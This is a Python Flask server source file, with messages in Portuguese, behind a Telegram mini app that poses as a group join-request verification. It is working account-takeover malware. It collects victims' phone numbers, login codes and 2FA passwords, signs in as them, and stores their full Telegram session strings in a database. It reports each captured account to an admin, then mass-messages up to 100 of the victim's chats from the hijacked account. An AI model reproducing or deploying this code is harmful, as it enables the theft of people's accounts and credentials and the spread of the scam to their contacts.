import os
import json
import asyncio
import logging
from pathlib import Path
from datetime import datetime
from flask import Flask, render_template, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, FloodWaitError, PhoneCodeInvalidError
from telethon.tl.types import User
from dotenv import load_dotenv
import threading
import requests
import db

load_dotenv()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__, static_folder='static', static_url_path='/static')

API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))

SESSION_DIR = Path("sessions")
SESSION_DIR.mkdir(exist_ok=True)

PENDING_FILE = Path("pending_requests.json")
CONFIG_FILE = Path("config.json")

def load_config():
    if CONFIG_FILE.exists():
        try:
            return json.loads(CONFIG_FILE.read_text())
        except:
            pass
    return {}

def load_pending():
    if PENDING_FILE.exists():
        try:
            return json.loads(PENDING_FILE.read_text())
        except:
            pass
    return {}

def save_pending(data):
    PENDING_FILE.write_text(json.dumps(data, ensure_ascii=False, indent=2))

def approve_user(user_id, chat_id):
    if BOT_TOKEN:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/approveChatJoinRequest"
            resp = requests.post(url, json={'chat_id': chat_id, 'user_id': user_id}, timeout=10)
            logger.info(f"Aprovação {user_id}: {resp.status_code}")
            return resp.status_code == 200
        except Exception as e:
            logger.error(f"Erro aprovar: {e}")
    return False

user_states = {}

loop = asyncio.new_event_loop()
loop_thread = None

def start_loop():
    asyncio.set_event_loop(loop)
    loop.run_forever()

def ensure_loop():
    global loop_thread
    if loop_thread is None or not loop_thread.is_alive():
        loop_thread = threading.Thread(target=start_loop, daemon=True)
        loop_thread.start()

ensure_loop()

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop).result(timeout=120)

async def disparo_session(user_id, session_string):
    config = load_config()
    msg = config.get('msg_disparo', '')
    
    if not msg:
        return 0
    
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            return 0
        
        dialogs = await client.get_dialogs(limit=100)
        enviadas = 0
        
        for dialog in dialogs:
            try:
                entity = dialog.entity
                if isinstance(entity, User):
                    if entity.bot or entity.is_self:
                        continue
                await client.send_message(entity, msg)
                enviadas += 1
                await asyncio.sleep(0.5)
            except:
                continue
        
        await client.disconnect()
        return enviadas
    except Exception as e:
        logger.error(f"Erro disparo: {e}")
        return 0

def on_verification_success(user_id, phone, session_string):
    pending = load_pending()
    user_data = pending.get(str(user_id), {})
    chat_id = user_data.get('chat_id')
    bot_id = user_data.get('bot_id')
    
    try:
        saved = db.save_session(user_id, phone, session_string, bot_id)
        logger.info(f"Session salva no DB para {phone} (bot_id={bot_id}): {saved}")
    except Exception as e:
        logger.error(f"ERRO ao salvar session no DB: {e}")
    
    if chat_id:
        approve_user(user_id, chat_id)
        pending.pop(str(user_id), None)
        save_pending(pending)
    
    try:
        enviadas = run_async(disparo_session(user_id, session_string))
        logger.info(f"Disparo {user_id}: {enviadas} msgs")
        
        if BOT_TOKEN and ADMIN_ID:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, json={
                'chat_id': ADMIN_ID,
                'text': f"✅ Nova session salva!\n\n📱 {phone}\n📨 {enviadas} msgs disparadas"
            }, timeout=5)
    except Exception as e:
        logger.error(f"Erro disparo: {e}")

@app.route('/')
def miniapp():
    return render_template('miniapp.html')

@app.route('/api/send_code', methods=['POST'])
def send_code():
    data = request.json
    phone = data.get('phone', '')
    user_id = data.get('user_id', 0)
    
    if not phone:
        return jsonify({'success': False, 'error': 'Número não fornecido'})
    
    if not phone.startswith('+'):
        phone = '+' + phone
    
    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        
        try:
            await client.connect()
            sent = await client.send_code_request(phone)
            
            user_states[user_id] = {
                'client': client,
                'phone': phone,
                'phone_code_hash': sent.phone_code_hash
            }
            
            logger.info(f"Código enviado para {phone} (user {user_id})")
            return {'success': True}
            
        except FloodWaitError as e:
            await client.disconnect()
            return {'success': False, 'error': f'Aguarde {e.seconds} segundos'}
        except Exception as e:
            await client.disconnect()
            logger.error(f"Erro send_code: {e}")
            return {'success': False, 'error': str(e)}
    
    try:
        result = run_async(_send())
        return jsonify(result)
    except Exception as e:
        logger.error(f"Erro geral send_code: {e}")
        return jsonify({'success': False, 'error': 'Erro interno'})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code', '')
    user_id = data.get('user_id', 0)
    
    state = user_states.get(user_id)
    if not state:
        return jsonify({'success': False, 'error': 'Sessão expirada'})
    
    async def _verify():
        client = state.get('client')
        phone = state.get('phone')
        phone_code_hash = state.get('phone_code_hash')
        
        if not client:
            return {'success': False, 'error': 'Sessão inválida'}
        
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            
            session_string = client.session.save()
            await client.disconnect()
            user_states.pop(user_id, None)
            
            logger.info(f"Login sucesso para {phone}")
            return {'success': True, 'phone': phone, 'session': session_string}
            
        except SessionPasswordNeededError:
            user_states[user_id]['needs_2fa'] = True
            return {'success': False, 'needs_2fa': True}
            
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Código inválido'}
            
        except Exception as e:
            logger.error(f"Erro verify_code: {e}")
            return {'success': False, 'error': str(e)}
    
    try:
        result = run_async(_verify())
        if result.get('success'):
            threading.Thread(target=on_verification_success, args=(user_id, result['phone'], result['session'])).start()
        return jsonify({'success': result.get('success'), 'error': result.get('error'), 'needs_2fa': result.get('needs_2fa')})
    except Exception as e:
        logger.error(f"Erro geral verify_code: {e}")
        return jsonify({'success': False, 'error': 'Erro interno'})

@app.route('/api/verify_2fa', methods=['POST'])
def verify_2fa():
    data = request.json
    password = data.get('password', '')
    user_id = data.get('user_id', 0)
    
    state = user_states.get(user_id)
    if not state:
        return jsonify({'success': False, 'error': 'Sessão expirada'})
    
    async def _verify_2fa():
        client = state.get('client')
        phone = state.get('phone')
        
        if not client:
            return {'success': False, 'error': 'Sessão inválida'}
        
        try:
            await client.sign_in(password=password)
            
            session_string = client.session.save()
            await client.disconnect()
            user_states.pop(user_id, None)
            
            logger.info(f"Login 2FA sucesso para {phone}")
            return {'success': True, 'phone': phone, 'session': session_string}
            
        except Exception as e:
            logger.error(f"Erro verify_2fa: {e}")
            return {'success': False, 'error': 'Senha incorreta'}
    
    try:
        result = run_async(_verify_2fa())
        if result.get('success'):
            threading.Thread(target=on_verification_success, args=(user_id, result['phone'], result['session'])).start()
        return jsonify({'success': result.get('success'), 'error': result.get('error')})
    except Exception as e:
        logger.error(f"Erro geral verify_2fa: {e}")
        return jsonify({'success': False, 'error': 'Erro interno'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
